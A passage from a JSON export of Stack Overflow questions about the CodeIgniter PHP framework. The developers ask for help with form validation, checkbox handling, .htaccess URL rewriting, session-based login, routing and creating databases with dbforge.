:</p>\n\n<pre><code>function add(){\n\n    $data['title'] = 'Tambah Category baru';\n    $data['action'] = site_url('category/add');\n    $data['link_back'] = anchor('category/index/', 'Back to Category list', array('class'=&gt;'back'));\n\n    //bedakan add/update\n    $data['validate'] = 'add';\n\n    $this-&gt;_set_rules();\n    //run validation\n    if($this-&gt;form_validation-&gt;run() == false){\n        $data['message'] = '';\n\n        $data['title'] = 'Add new Category';\n        //$data['message'] = '';\n        $data['category']['ID_category'] = '';\n        $data['category']['ID_user'] = '';\n        $data['category']['Nama_category'] = '';\n        $data['category']['Description'] = '';\n        $data['category']['Visible'] = '';\n        $data['link_back'] = anchor('category/index/', 'Lihat daftar Category', array('class'=&gt;'back'));\n\n        $this-&gt;load-&gt;view('category_form_v', $data);\n    }\n\n    else{\n        //save data\n        $category = array('ID_category'=&gt;$this-&gt;input-&gt;post('ID_category'),\n        'ID_user'=&gt;'TESTING USER',\n        'Nama_category'=&gt;$this-&gt;input-&gt;post('Nama_category'),\n        'Description'=&gt;$this-&gt;input-&gt;post('Description'),\n        'Visible'=&gt;($$this-&gt;input-&gt;post('Visible') !== false ? '1' : '0'),\n        'tgl_buat '=&gt;date('Y-m-d H:i:s'));\n\n        $ID_category = $this-&gt;category_m-&gt;save($category);\n\n        $this-&gt;validation-&gt;ID_category = $ID_category;\n\n        redirect('category/index/add_success');\n    }\n}\n</code></pre>\n\n<p>And my HTML code(in Views) :</p>\n\n<pre><code>&lt;td valign=\"top\"&gt;Visible&lt;span style=\"color:red;\"&gt;*&lt;/span&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;input type=\"checkbox\" name=\"Visible\" class=\"text\"/&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12338922,"title":"passing in form variables to controller","body":"<p>Hey guys just trying to pass some stuff into my controller. Using codeigniter the below form isn't actually redirecting me anywhere, what's wrong?</p>\n\n<p>my second question is how to do i grab the data in my controller just a simple..?</p>\n\n<pre><code>$data = $this-&gt;input-&gt;$post('search'); \n</code></pre>\n\n<hr>\n\n<pre><code>&lt;?php\n$options = array(\n                  'small'  =&gt; 'Small Shirt',\n                  'med'    =&gt; 'Medium Shirt',\n                  'large'   =&gt; 'Large Shirt',\n                  'xlarge' =&gt; 'Extra Large Shirt',\n                );\n\n$shirts_on_sale = array('small', 'large');\necho form_dropdown('shirts', $options, 'large');\n\n?&gt;\n &lt;form  action=\"&lt;?php echo site_url('home/id_search');?&gt;\" method=\"post\"&gt;&lt;input type=\"submit\" value=\"submit\" id=\"\" name=\"\" &gt;\n&lt;/form&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":9912,"score":7,"question_id":1837467,"title":"Sending data along with a redirect in CodeIgniter","body":"<p>I have a simple C (of CRUD) function, and I'd like to send a message (error or success) along with my redirect from the \"insert\" function I have written up. Is there a way to adhere a POST field with a redirect?</p>\n\n<p>In pseudo code I have:</p>\n\n<pre><code>function view_all{\n    //set up some initial variables\n    $this-&gt;load-&gt;view(viewing_page, $data)\n}\n\nfunction insert{\n    if ($this-&gt;db-&gt;insert(my_table, $_POST)){\n        $message = \"All's well\";\n    }\n    else {\n        $message = \"whoops!\";\n    }\n    redirect(view_all);\n}\n</code></pre>\n\n<p>So the viewing_page ideally would have something like </p>\n\n<pre><code>if (isset($message)){\n    echo $message\n}\n</code></pre>\n\n<p>So on the first time through, I don't see any message, and when/if there's an insert, it pops up the same page with the message. Thanks!</p>\n"},{"tags":["php","codeigniter","form-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12338389,"title":"dynamically change visibility of input text in code igniter","body":"<p>I have a variable that i will pass from my controller to my view, lets call this variable <code>$validate</code>. This variable will help us to know in what state is the user in (Update or Save).\nI will ask user to input an ID and Password in <strong>Save</strong> state (<strong>input text id = enable, password = visible</strong>)\nBut in <strong>Update</strong> state, i dont want user to update their ID and they cant see their Password (<strong>input text id = disable, password = invisible</strong>).\nNow for the input text id, i could do something like this :\n<code>&lt;input type=\"text\" name=\"ID_user\" class=\"text\"\n                    &lt;?php if($validate!='add'){echo \"disabled\";} ?&gt;</code>\nSo <strong>no javascript are needed in the input text ID</strong>\nMy Question are :</p>\n\n<ol>\n<li><p>How to make the input text password invisible according to <code>$validate</code> value?</p></li>\n<li><p>Can i use the same way like input text ID?(so no javascript are needed)\nThanks :D</p></li>\n</ol>\n\n<p><strong>Note : i use the same form for Update and Save :D</strong></p>\n"},{"tags":["codeigniter","upload","mime-types"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2456,"score":3,"question_id":4731071,"title":"Uploading a csv into Codeigniter","body":"<p>Has anyone else had trouble uploading a csv file into Codeigniter? I'm getting a pretty annoying \"The filetype you are attempting to upload is not allowed.\" error, even though I've quite explicitly set the upload type. Here's my code (should be fairly standard stuff):</p>\n\n<pre><code>    function doUpload() {\n\n    $config['upload_path'] = 'uploads/';\n    $config['allowed_types'] = 'text/plain|text/csv|csv';\n    $config['max_size'] = '5000';\n    $config['file_name'] = 'upload' . time();\n\n    $this-&gt;load-&gt;library('upload', $config);\n\n    if(!$this-&gt;upload-&gt;do_upload()) echo $this-&gt;upload-&gt;display_errors();\n    else {\n        $file_info = $this-&gt;upload-&gt;data();\n        $csvfilepath = \"uploads/\" . $file_info['file_name'];\n        $this-&gt;addfromcsv($csvfilepath);\n\n    }\n\n}\n</code></pre>\n\n<p>I tried to cover all the bases in my allowed types - maybe I missed one?\nThanks for any help with this!</p>\n"},{"tags":["php","codeigniter","content-management-system","codeigniter-2","halogy"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12263600,"title":"Halogy CMS - custom navigation","body":"<p>Hy, i just recently started to use Halogy, it's a cms based on codeigniter.\nI'm currently just checking it out so i'm using the free version, but i cant get my mind wrapped around the custom navigation option.</p>\n\n<p>First of all i cant access the navigation section, and i cant show custom navigation in the template using this {navigation(custom)}</p>\n\n<p>Thanks for any help</p>\n"},{"tags":["php","apache",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12331074,"title":"Cannot remove index.php using htaccess","body":"<p>When I try to remove index.php\nand access controller: mysite.com/admin\nI keep getting Internal Server Error.\nI have no idea why it doesn't work.</p>\n\n<p>.htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /code/\n\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n&lt;/IfModule&gt; \n</code></pre>\n\n<p>Site config</p>\n\n<pre><code>&lt;Directory /home/mysite.com/public_html/&gt;\nOptions Indexes Includes FollowSymLinks MultiViews\nAllowOverride AuthConfig FileInfo\nOrder allow,deny\nAllow from all\n&lt;/Directory&gt; \n</code></pre>\n\n<p>Apache error log</p>\n\n<pre><code>[Sat Sep 08 15:24:30 2012] [error] [client 176.106.162.240] \nRequest exceeded the limit of 10 internal redirects \ndue to probable configuration error. Use 'LimitInternalRecursion' \nto increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.\n</code></pre>\n"},{"tags":["codeigniter","drop-down-menu"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12336872,"title":"Codeigniter dropdown default to last item?","body":"<p>I create an array of numbers for ordering a gallery. I wanted to know if there was a way to have the dropdown default to the last item instead of the first? So with the example code when the page loads it would have the 6th element (value 5) selected as default.</p>\n\n<pre><code>&lt;php? // Codeigniter that generates the select dropdown.\nform_dropdown('order', $order);\n?&gt;\n\n&lt;select name=\"order\"&gt;\n    &lt;option value=\"0\"&gt;1&lt;/option&gt;\n    &lt;option value=\"1\"&gt;2&lt;/option&gt;\n    &lt;option value=\"2\"&gt;3&lt;/option&gt;\n    &lt;option value=\"3\"&gt;4&lt;/option&gt;\n    &lt;option value=\"4\"&gt;5&lt;/option&gt;\n    &lt;option value=\"5\"&gt;6&lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","module","codeigniter-2","hmvc"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":95,"score":3,"question_id":12336103,"title":"In Modular Codeigniter, how can/should one module's controller call another module's function?","body":"<p>I am using CodeIgniter with the HMVC extension by wiredesignz.</p>\n\n<p>My web app deals primarily with text articles. I have a module called <code>articles</code>. The model of the articles module, <code>articles_model</code>, contain functions that make database changes to the articles. For instance, the following will update the article:</p>\n\n<pre><code>$this-&gt;articles_model-&gt;update_article();\n</code></pre>\n\n<p>There is another module for the user dashboard. Users will sometimes make updates to the articles from within their dashboard. The request is made from the dashboard controller, as this action is executed from views within the dashboard module.</p>\n\n<p>In this situation, how should I let the dashboard controller communicate with the articles model? The couple of options I've come across so far is:</p>\n\n<ol>\n<li><p>Make an <code>update_article()</code> function in the articles controller. All it does is call the <code>articles_model</code> function of the same name. Have the dashboard controller call the articles controller function <code>update_article()</code>. This would be done because I have read that in modular design, the controllers should be the point of communication between different modules (<a href=\"http://techportal.inviqa.com/2010/02/22/scaling-web-applications-with-hmvc/\" rel=\"nofollow\">source</a>). I've also come across other opinions that say controllers should never talk to each other. Hence my confusion.</p></li>\n<li><p>I could also duplicate the <code>update_article()</code> function in the <code>dashboard_model</code>. This way the dashboard controller will only have to call its own model, within its own module. My gut tells me this is not the way to go, as the <code>update_article()</code> function is called not only by the dashboard controller, but also quite a few others. This would result in a lot of duplicate code.</p></li>\n</ol>\n\n<p>Any advice is appreciated.</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12334969,"title":"display multiple categories codeigniter","body":"<p>I have a relational database in this format</p>\n\n<pre><code>Table: posts\nColumns: post_id,post_title,post_content\n\nTable: categories\nColumns: category_id,category_name\n\nTable: posts_categories\nColumns: post_id,category_id\n</code></pre>\n\n<p>Posts can have multiple categories so i store them in posts_categories using post and category id, when i get results from database using below query, it just display the last category, Is it possible to display all categories otherwise i have to run a separate query, here my code.</p>\n\n<pre><code>    $this-&gt;db-&gt;select(\"p.*,pc.*,c.*\");\n    $this-&gt;db-&gt;where('post_id', $id); \n    $this-&gt;db-&gt;from('posts AS p');\n    $this-&gt;db-&gt;join('posts_categories AS pc', 'pc.post_id = p.post_id', 'inner');\n    $this-&gt;db-&gt;join('categories AS c', 'pc.category_id = c.category_id', 'inner');\n    $q = $this-&gt;db-&gt;get();\n</code></pre>\n\n<p>Thanks for any help.</p>\n"},{"tags":["json","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12333325,"title":"Echo php function and json in javascript","body":"<p>I am using Codeigniter. I want to get the base_url() and json data so i can retrieve the image url. But how can i compile the base_url() and the json.</p>\n\n<p>Below is what i tried but not working</p>\n\n<pre><code>        var url = &lt;?php echo base_url(); ?&gt;;\n        var image = document.write(url + obj[0].picture);\n</code></pre>\n\n<p>@tom's comment is my answer.</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":652,"score":1,"question_id":7604999,"title":"Codeigniter PHP Fatal error: Call to a member function item() on a non-object when call $this->config->item(‘config_item’)","body":"<pre><code>$this-&gt;config-&gt;item('config_item')\n</code></pre>\n\n<blockquote>\n  <p>PHP Fatal error: Call to a member function item() on a non-object</p>\n</blockquote>\n\n<p>Anyone knows how to fix this kind of problem? Or anyone ever been had same stuff?</p>\n\n<p>The error happens on every call of config item rather in libraries classes (e.g. <code>form_validation</code> class) or in application controller.</p>\n\n<p>If I <code>print_r($this-&gt;config)</code> it shows array of config content.</p>\n"},{"tags":["php","codeigniter","function","yii"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12332856,"title":"use external function in Yii Controller (Helper function)","body":"<p>I develop some web sites by CodeIgniter,it has got helper file,which can be written by developer to use some function in class.</p>\n\n<p>Now I'm developing web site by Yii,and I have php file which has function that should be used in Controller. How can I import them and use them in Controller method? </p>\n"},{"tags":["php","codeigniter","orm","datamapper","codeigniter-datamapper"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12333293,"title":"Using DataMapper ORM and Codeigniter to select join table value in a many to many relationship","body":"<p>I have this table structure:</p>\n\n<p>| users | --- has many > --- | preferences_users | --- &lt; has many --- | preferences |</p>\n\n<p>A preference could be something like \"first name\" or \"surname\" but the value for these preferences are stored in the joining table.</p>\n\n<p>I am using Codeigniter and Datamapper ORM to get relational tables into objects, however I am not sure how to get this value in the joining table.</p>\n\n<p>I am doing this:</p>\n\n<pre><code>$user = new User();\n$user-&gt;where('unique_url', $url)-&gt;get();\n$user-&gt;preferences-&gt;get_iterated();\n</code></pre>\n\n<p>My relationships are set up so that they both have <code>$has_many = array('tablename');</code> and I am able to get the values from each table.</p>\n\n<p>HOwever I want to be able to get a table column value from the joining table, does anyone know how to do this?</p>\n\n<p>Thanks,</p>\n\n<p>Ian</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":5,"up_vote_count":5,"down_vote_count":0,"view_count":3667,"score":5,"question_id":6234855,"title":"get multiple values of checkbox","body":"<p>how can i get multiple checked box values in codeigniter with this code</p>\n\n<pre><code>&lt;input type=\"checkbox\" name=\"assign[]\" value=\"Keyur\"&gt;&amp;nbsp;Keyur&lt;br/&gt;\n        &lt;input type=\"checkbox\" name=\"assign[]\" value=\"Ritesh\"&gt;&amp;nbsp;Ritesh&lt;br/&gt;\n        &lt;input type=\"checkbox\" name=\"assign[]\" value=\"Saurabh\"&gt;&amp;nbsp;Saurabh&lt;br/&gt;\n        &lt;input type=\"checkbox\" name=\"assign[]\" value=\"Maulik\"&gt;&amp;nbsp;Maulik&lt;br/&gt;\n</code></pre>\n\n<p>at the controller</p>\n\n<pre><code>$data1 = $this-&gt;input-&gt;post('assign[]');\n</code></pre>\n\n<p>i do that but can't get values,where i make mistake????</p>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12331160,"title":"codeigniter .htaccess url issue","body":"<p>I want to do this: (firstly, ci is my codeigniter folder)<br/>If user call ci/2012.htm I want to redirect ci/oyna/oyun/2012.htm I'm trying to use this but It's not running.</p>\n\n<pre><code>    RewriteEngine on\n    RewriteCond $1 !^(index\\.php|resources|robots\\.txt)\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php/$1 [L,QSA]\n    RewriteRule ^(.*)$ index.php/oyna/oyun/$1 [L,QSA]\n</code></pre>\n\n<p>When I call ci/2012.htm it returns codeigniter 404 not found page.</p>\n"},{"tags":["facebook","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":174,"score":0,"question_id":9834400,"title":"Facebook SDK with Codeigniter and Codeigniter CSRF Enabled","body":"<p>I followed this tutorial here:\n<a href=\"http://www.dannyherran.com/2011/02/facebook-php-sdk-and-codeigniter-for-basic-user-authentication/\" rel=\"nofollow\">http://www.dannyherran.com/2011/02/facebook-php-sdk-and-codeigniter-for-basic-user-authentication/</a></p>\n\n<p>It works great but when I enable CSRF protection I no longer get the info back from facebook. How can I use Codeigniter CSRF protection and the facebook sdk?</p>\n"},{"tags":["php","oop","codeigniter","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12332064,"title":"Codeigniter Inputting session data from model for a simple authentication system","body":"<p>Trying to put together a simple login authentication.  Been at this for quite sometime, and I can't find where I'm going wrong. Pretty new to Codeigniter and OOP PHP.  I know there are authentication libraries out there, but I'm not interested in using those.</p>\n\n<p>Model:</p>\n\n<pre><code> function login($username, $password){\n\n    if ($this-&gt;db-&gt;table_exists($username)){\n    $this-&gt;db-&gt;where('username', $username);\n    $this-&gt;db-&gt;where('password', $password);\n    $query = $this-&gt;db-&gt;get($username); \n\n        if($query-&gt;num_rows &gt;= 1)\n        {\n        return true;\n        $data = array(\n            'username' =&gt; $this-&gt;input-&gt;post('username'),\n            'login' =&gt; true\n            );\n            $this-&gt;session-&gt;set_userdata($data);\n\n        } \n    }  \n    }\n</code></pre>\n\n<p>Controller</p>\n\n<pre><code>function __construct(){\n    parent::__construct();\n    $this-&gt;logincheck();\n}\npublic function logincheck(){\n    if ($this-&gt;session-&gt;userdata('login')){\n        redirect('/members');\n        }\n    }\n</code></pre>\n\n<p>If I just echo from the controller: $this->session->all_userdata(); I get an empty array.  So the problem seems to be that the $data array in the model isn't being stored in the session.</p>\n"},{"tags":["php","codeigniter","url","routes"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12331554,"title":"Codeigniter Product Routing","body":"<p>I have a controller Products and DB table categories. </p>\n\n<p>Products has index function which determines from what category should the products be loaded.</p>\n\n<p>But the URL looks like this: <code>products/index/(category-name)</code></p>\n\n<p>And I want it to look like this: <code>products/(category-name)</code></p>\n\n<p>Could someone help me please? I would be very thankful.</p>\n\n<p>NOTE: I do have RewriteEngine On</p>\n\n<p>SOLUTION: <code>$route['^(en|sk)/products/(:any)'] = \"/products/index/$1\";</code></p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12331563,"title":"Forcing file to download in CodeIgniter FTP class","body":"<p>I am using the FTP class in CodeIgniter, they have a function for downloading the file from the FTP, however, its only to the server itself. I am trying to get it to download straight to the user.</p>\n\n<p>I know that i could just save it to the server and then force download and then delete. But its a bit of a hassle if the file is large and it would be slow.</p>\n\n<p>So i am wondering from this code, if there is anyway just to use the force_download CI function?</p>\n\n<p>Example;</p>\n\n<pre><code>$this-&gt;ftp-&gt;download('/public_html/myfile.html', '/local/path/to/myfile.html', 'ascii');\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["codeigniter","phpmyadmin","cpanel","mysql-error-1044"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":138,"score":0,"question_id":12296665,"title":"How we can give permission to a user to create database in phpmyadmin(cPanel)?","body":"<p>I have a database and a user which is created through cpanel(i have added that user to that database and i am able to access that database using that user and its password. i have given all privileges to that user through cPanel(by clicking on the username in 'current database' table in cpanel and clicking on all privileges check box ).                                                   </p>\n\n<p>In my application(which is created using PHP- Codeigniter framework) i want to create new database and tables in that database as per users requirement. For that i am using Codeigniter dbforge class for creating database and the tables in that.</p>\n\n<pre><code>$this-&gt;load-&gt;dbforge();\n       if ($this-&gt;dbforge-&gt;create_database($database_name)){\n\n            $config['hostname'] = \"localhost\";\n            $config['username'] = \"user_name\";\n            $config['password'] = \"users_password\";\n            $config['database'] = $database_name;\n            $config['dbdriver'] = \"mysql\";\n            $config['dbprefix'] = \"\";\n            $config['pconnect'] = TRUE;\n            $config['db_debug'] = TRUE;\n            $config['cache_on'] = FALSE;\n            $config['cachedir'] = \"\";\n            $config['char_set'] = \"utf8\";\n            $config['dbcollat'] = \"utf8_general_ci\";\n            $config['swap_pre'] = '';\n            $config['autoinit'] = TRUE;\n            $config['stricton'] = FALSE;\n\n            $db_new=$this-&gt;load-&gt;database($config,TRUE);\n\n            $this-&gt;db=$db_new;\n            $this-&gt;load-&gt;dbforge();\n            $fields=array(\n               'id'=&gt;array('type'=&gt;'INT','auto_increment'=&gt;TRUE,'constraint'=&gt;'5'),\n               'first_name'=&gt;array('type'=&gt;'VARCHAR','constraint'=&gt;'60'),\n               'last_name'=&gt;array('type'=&gt;'VARCHAR','constraint'=&gt;'60','null' =&gt; TRUE),\n              );\n\n            $this-&gt;dbforge-&gt;add_field($fields);\n            $this-&gt;dbforge-&gt;add_key('id',TRUE);\n            $this-&gt;dbforge-&gt;create_table('clients');\n\n        }\n</code></pre>\n\n<p>In the above code i am creating a database first and then loading that database as the current database . This code works perfectly in local host WAMP server but when i uploaded it to the server and then tried to create the database it gives the following Error </p>\n\n<pre><code>Error No 1044: Access denied for user 'username'@'localhost' to database 'database_name' \n</code></pre>\n\n<p>The line of code which caused thr error is </p>\n\n<pre><code>if ($this-&gt;dbforge-&gt;create_database($database_name)){\n</code></pre>\n\n<p><strong>*<em>In that database config setting shown in the above code the  'username' and 'password' is given as the username and password of the already existing database(which is created through cPanel)</strong> . Is that the problem...?</em>* . </p>\n\n<p>the current user using which we are trying to create new database is having all the avilable privileges. but in that 'CREATE DATABASE ' privilege is not there.</p>\n\n<p>For database naming I have used the ' <em>prefix_</em> ' in the database name(CPanel database naming format)</p>\n\n<p>How can i create the database using dbforge class and access to that database using a existing user ...?</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":33,"score":-3,"question_id":12327608,"title":"Codeigniter logical operator","body":"<p>I ask the question before I was not getting anymore replies and I decide to re-post it if that will help. I hope i'm not doing anything wrong by re-posting?</p>\n\n<pre><code>$total_cost_for_A = $this-&gt;admin_model-&gt;total_cost_for_A($branch, $department, $date);\n$total_cost_for_B = $this-&gt;admin_model-&gt;total_cost_for_B($branch, $department, $date);\n</code></pre>\n\n<p>The variables <i>$total_cost_for_A and $total_cost_for_B</i>  hold the returned value from a mysql summation queries in the model. The queries return false if no record was found. Now, I'm trying to perform this operation.</p>\n\n<pre><code>if(($total_cost_for_A === FALSE) &amp;&amp; ($total_cost_for_B === FALSE))\n{\n  $data['no_record'] = 'No Record Found!';\n  $this-&gt;load-&gt;view('admin/bookings', $data);\n}\nelse\n{\n    $this-&gt;load-&gt;view('admin/summary', $data);\n}\n</code></pre>\n\n<p>This test always fail and execute the else statement instead, which is not what. Any assistance will be appreciated. Thanks</p>\n\n<p><b>Here are the functions</b></p>\n\n<pre><code>    function total_cost_for_A($branch, $department, $date)\n    {\n        if($branch == 'Head Office' &amp;&amp; $department == 'Summary')\n        {\n            $select_amount_paid = 'SELECT SUM(total_amount) total_amount FROM graphics_booking AS bk\n            WHERE bk.date = \"'.$date.'\"';\n        }\n\n        $result = $this-&gt;db-&gt;query($select_amount_paid);\n\n        if($result-&gt;num_rows() &gt; 0)\n        {\n            return $result;\n        }\n        else\n        {\n            return FALSE;\n        }\n    }\n\n\n    function total_cost_for_B($branch, $department, $date)\n    {\n        if($branch == 'Head Office' &amp;&amp; $department == 'Summary')\n        {\n            $total_LF_amount = 'SELECT SUM(total_amount) total_amount FROM large_format_print\n            WHERE date = \"'.$date.'\"';\n        }\n\n        $result = $this-&gt;db-&gt;query($total_LF_amount);\n\n        if($result-&gt;num_rows() &gt; 0)\n        {\n            return $result;\n        }\n        else\n        {\n            return FALSE;\n        }\n    }\n</code></pre>\n"},{"tags":["php","validation","codeigniter","form-validation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":130,"score":0,"question_id":12329827,"title":"form validation error with hidden type code igniter","body":"<p>This is a continue question from <a href=\"http://stackoverflow.com/questions/12329534/form-validation-for-different-condition-in-code-igniter#comment16549157_12329534\">here</a></p>\n\n<p>The case is : after i add a hidden field, now i could Update but i CANT save because everytime i try to save, this error message keep showing up : <code>The User ID field is required.</code></p>\n\n<p>This is the controller, function add is for Save and update for Update :</p>\n\n<pre><code>function add(){\n    //set common properties \n    $data['title'] = 'Tambah User baru';\n    $data['action'] = site_url('user/add');\n    $data['link_back'] = anchor('user/index/', 'Back to User list', array('class'=&gt;'back'));\n\n    //bedakan add/update\n    $data['validate'] = 'add';\n\n    $this-&gt;_set_rules();\n    //run validation\n    if($this-&gt;form_validation-&gt;run() == false){\n        $data['message'] = '';\n\n        $data['title'] = 'Add new User';\n        //$data['message'] = '';\n        $data['user']['ID_user'] = '';\n        $data['user']['pass'] = '';\n        $data['user']['nama'] = '';\n        $data['user']['email'] = '';\n        $data['user']['active'] = '';\n        $data['link_back'] = anchor('user/index/', 'Lihat daftar User', array('class'=&gt;'back'));\n\n        $this-&gt;load-&gt;view('user_form_v', $data);\n    }\n\n    else{\n        //save data\n        $user = array('ID_user'=&gt;$this-&gt;input-&gt;post('ID_user'),\n        'pass'=&gt;sha1($this-&gt;input-&gt;post('pass')),\n        'nama'=&gt;$this-&gt;input-&gt;post('nama'),\n        'email'=&gt;$this-&gt;input-&gt;post('email'),\n        'active'=&gt;$this-&gt;input-&gt;post('active'),\n        'regis_date'=&gt;date('Y-m-d H:i:s'));\n\n        $ID_user = $this-&gt;user_m-&gt;save($user);\n\n        //set form input nama = \"id\"\n        $this-&gt;validation-&gt;ID_user = $ID_user;\n\n        redirect('user/index/add_success');\n    }\n}\n\nfunction update($ID_user){\n    //set common properties\n    $data['title'] = 'Update user';\n    $this-&gt;load-&gt;library('form_validation');\n\n    //set validation properties\n    $this-&gt;_set_rules();\n    $data['action'] = ('user/update/'.$ID_user);\n\n    //bedakan add/update\n    $data['validate'] = 'update';\n\n    //run validation\n    if ($this-&gt;form_validation-&gt;run() == false){\n        $data['message'] = '';\n\n        $data['user'] = $this-&gt;user_m-&gt;get_by_id($ID_user)-&gt;row_array();\n        //set common properties\n        $data['title'] = 'Update User';\n        $data['message'] = '';\n    }\n    else{\n        //save data\n        $ID_user = $this-&gt;input-&gt;post('ID_user');\n        $user = array(\n        'pass'=&gt;$this-&gt;input-&gt;post('pass'),\n        'nama'=&gt;$this-&gt;input-&gt;post('nama'),\n        'email'=&gt;$this-&gt;input-&gt;post('email'),\n        'active'=&gt;$this-&gt;input-&gt;post('active'),\n        'regis_date'=&gt;date('Y-m-d H:i:s'));\n\n        $this-&gt;user_m-&gt;update($ID_user, $user);\n        $data['user'] = $this-&gt;user_m-&gt;get_by_id($ID_user)-&gt;row_array();\n\n        //set user message\n        $data['message'] = 'Update User Success!';\n    }\n\n    $data['link_back'] = anchor('user/index/', 'Lihat daftar user', array('class'=&gt;'back'));\n    //load view\n    $this-&gt;load-&gt;view('user_form_v', $data);\n}\n</code></pre>\n\n<p>And this is my view :</p>\n\n<pre><code>&lt;input type=\"text\" name=\"ID_user\" class=\"text\"\n                &lt;?php if($validate!='add'){echo \"disabled\";} ?&gt;\n                value=\"&lt;?php echo (isset($user['ID_user']))?$user['ID_user']:\"\"?&gt;\"/&gt;\n                &lt;input type=\"hidden\" name=\"ID_user\" value=\"&lt;?php echo (isset($user['ID_user']))?$user['ID_user']:\"\"?&gt;\"/&gt;\n</code></pre>\n\n<p><strong>note : if the name for input text and input hidden is SAME then the update is working but the save is not working, but if the name is different then the update is not working but the save is working @_@</strong></p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12329534,"title":"form validation for different condition in code igniter","body":"<p>So i have a form that used for two functions/conditions : Save(add) and Update\nNow i set a rule to my input text : <code>$this-&gt;form_validation-&gt;set_rules('ID_user', 'User ID', 'required');</code></p>\n\n<p>The logic is like this: if the user is in Save condition then my input text will be enable because they will tyoe their id, but if the user is in Update condition then my input text will be disable and the text will be the current user id because they cant change their user id.</p>\n\n<p>This is the Save(add) and update functions in my controller :</p>\n\n<pre><code>function add(){\n    //set common properties \n    $data['title'] = 'Tambah User baru';\n    $data['action'] = site_url('user/add');\n    $data['link_back'] = anchor('user/index/', 'Back to User list', array('class'=&gt;'back'));\n\n    $this-&gt;_set_rules();\n    //run validation\n    if($this-&gt;form_validation-&gt;run() == false){\n        $data['message'] = '';\n        //bedakan add/update\n        $data['validate'] = 'add';\n        //set common properties \n        $data['title'] = 'Add new User';\n        //$data['message'] = '';\n        $data['user']['ID_user'] = '';\n        $data['user']['pass'] = '';\n        $data['user']['nama'] = '';\n        $data['user']['email'] = '';\n        $data['user']['active'] = '';\n        $data['link_back'] = anchor('user/index/', 'Lihat daftar User', array('class'=&gt;'back'));\n\n        $this-&gt;load-&gt;view('user_form_v', $data);\n    }\n\n    else{\n        //save data\n        $user = array('ID_user'=&gt;$this-&gt;input-&gt;post('ID_user'),\n        'pass'=&gt;sha1($this-&gt;input-&gt;post('pass')),\n        'nama'=&gt;$this-&gt;input-&gt;post('nama'),\n        'email'=&gt;$this-&gt;input-&gt;post('email'),\n        'active'=&gt;$this-&gt;input-&gt;post('active'),\n        'regis_date'=&gt;date('Y-m-d H:i:s'));\n\n        $ID_user = $this-&gt;user_m-&gt;save($user);\n\n        //set form input nama = \"id\"\n        $this-&gt;validation-&gt;ID_user = $ID_user;\n\n        redirect('user/index/add_success');\n    }\n}\n\nfunction update($ID_user){\n    //set common properties\n    $data['title'] = 'Update user';\n    $this-&gt;load-&gt;library('form_validation');\n\n    //set validation properties\n    $this-&gt;_set_rules();\n    $data['action'] = ('user/update/'.$ID_user);\n\n    //bedakan add/update\n    $data['validate'] = 'update';\n\n    //run validation\n    if ($this-&gt;form_validation-&gt;run() == false){\n        $data['message'] = '';\n\n        $data['user'] = $this-&gt;user_m-&gt;get_by_id($ID_user)-&gt;row_array();\n        //set common properties\n        $data['title'] = 'Update User';\n        $data['message'] = '';\n    }\n    else{\n        //save data\n        